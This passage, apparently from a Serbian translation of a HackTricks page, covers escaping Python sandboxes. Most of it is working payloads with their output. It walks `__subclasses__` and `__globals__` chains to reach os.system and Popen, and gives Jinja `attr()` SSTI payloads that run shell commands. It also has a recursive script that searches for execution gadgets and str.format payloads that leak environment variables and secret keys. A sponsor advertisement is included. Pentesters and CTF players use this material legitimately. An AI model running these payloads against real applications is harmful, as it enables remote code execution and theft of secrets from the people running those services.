'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Ispod se nalazi veća funkcija**](./#rekurzivno-pretraživanje-ugrađenih-globalnih-promenljivih) za pronalaženje desetina/**stotina** **mesta** gde možete pronaći **globalne promenljive**.

## Otkrivanje proizvoljnog izvršavanja

Ovde želim da objasnim kako lako možete otkriti **opasnije funkcionalnosti koje su učitane** i predložiti pouzdanije eksploate.

#### Pristupanje podklasama uz zaobilaznice

Jedan od najosetljivijih delova ove tehnike je mogućnost **pristupa osnovnim podklasama**. U prethodnim primerima to je bilo postignuto korišćenjem `''.__class__.__base__.__subclasses__()` ali postoje **i druge moguće metode**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Pronalaženje opasnih biblioteka koje su učitane

Na primer, znajući da je sa bibliotekom **`sys`** moguće **uvoziti proizvoljne biblioteke**, možete pretraživati sve **učitane module koji su unutar sebe uvezli sys**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Postoji mnogo njih, a **samo nam je potrebna jedna** da izvršimo komande:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Možemo uraditi istu stvar sa **drugim bibliotekama** koje znamo da se mogu koristiti za **izvršavanje komandi**:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Osim toga, čak možemo pretraživati koje module učitavaju zlonamerne biblioteke:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Osim toga, ako mislite da **druge biblioteke** mogu biti u mogućnosti **pozivati funkcije za izvršavanje komandi**, takođe možemo **filtrirati po imenima funkcija** unutar mogućih biblioteka:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Rekurzivno pretraživanje ugrađenih funkcija, globalnih promenljivih...

{% hint style="warning" %}
Ovo je jednostavno **sjajno**. Ako **tražite objekat kao što su globals, builtins, open ili bilo šta drugo**, samo koristite ovaj skript da **rekurzivno pronađete mesta gde možete pronaći taj objekat**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Možete proveriti izlaz ovog skripta na ovoj stranici:

{% content-ref url="broken-reference" %}
[Slomljeni link](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celom vašem tehnološkom skupu, od API-ja do veb aplikacija i sistemima u oblaku. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Formatiranje Stringa

Ako **pošaljete** **string** u python koji će biti **formatiran**, možete koristiti `{}` da pristupite **internim informacijama pythona**. Možete koristiti prethodne primere da pristupite globalnim ili ugrađenim funkcijama, na primer.

{% hint style="info" %}
Međutim, postoji **ograničenje**, možete koristiti samo simbole `.[]`, tako da **nećete moći izvršiti proizvoljni kod**, samo čitati informacije.\
_**Ako znate kako izvršiti kod putem ove ranjivosti, molim vas da me kontaktirate.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Primetite kako možete **pristupiti atributima** na uobičajen način sa **tačkom** kao što je `people_obj.__init__` i **elementima rečnika** sa **zagradama** bez navodnika `__globals__[CONFIG]`

Takođe, primetite da možete koristiti `.__dict__` da biste nabrojali elemente objekta `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Još neke interesantne karakteristike formatiranja stringova su mogućnost **izvršavanja** **funkcija** **`str`**, **`repr`** i **`ascii`** u naznačenom objektu dodavanjem **`!s`**, **`!r`**, **`!a`** redom:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
Osim toga, moguće je **kodirati nove formatere** u klasama:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Više primera** o **formatiranju** **stringova** možete pronaći na [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Takođe proverite sledeću stranicu za uređaje koji će **čitati osetljive informacije iz internih Python objekata**:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Payloadi za otkrivanje osetljivih informacija
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Rasklapanje Python objekata

{% hint style="info" %}
Ako želite da **naučite** detaljnije o **Python bajtkodu**, pročitajte ovaj **sjajan** članak na temu: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

U nekim CTF-ovima može vam biti dostavljeno ime **prilagođene funkcije u kojoj se nalazi zastava**, a vi trebate videti **unutrašnjost** te **funkcije** da biste je izvukli.

Ovo je funkcija koju treba pregledati:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

`dir` je ugrađena Python funkcija koja vraća listu atributa i metoda objekta. Ova funkcija je korisna za istraživanje dostupnih funkcionalnosti objekta.

Primjer upotrebe:

```python
>>> dir(objekat)
```

Ova linija koda će vratiti listu atributa i metoda objekta `objekat`.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` i `func_globals` (isti) dobijaju globalno okruženje. U primeru možete videti neke uvežene module, neke globalne promenljive i njihov sadržaj koji je deklarisan:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Pogledajte ovde više mesta za dobijanje globalnih promenljivih**](./#globals-and-locals)

### **Pristupanje kodu funkcije**

**`__code__`** i `func_code`: Možete **pristupiti** ovom **atributu** funkcije da biste **dobili objekat koda** funkcije.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Dobijanje informacija o kodu

Da biste zaobišli Python peskovnike, prvo morate dobiti informacije o kodu koji se izvršava unutar peskovnika. Ovo vam omogućava da razumete ograničenja i bezbednosne mehanizme koje treba zaobići.

#### 1. Prikupljanje informacija o Python verziji

Da biste saznali koju verziju Pythona koristi peskovnik, možete koristiti sledeći kod:

```python
import sys
print(sys.version)
```

#### 2. Prikupljanje informacija o modulima

Da biste saznali koje module koristi peskovnik, možete koristiti sledeći kod:

```python
import sys
print(sys.modules.keys())
```

#### 3. Prikupljanje informacija o promenljivama okruženja

Da biste saznali koje promenljive okruženja koristi peskovnik, možete koristiti sledeći kod:

```python
import os
print(os.environ)
```

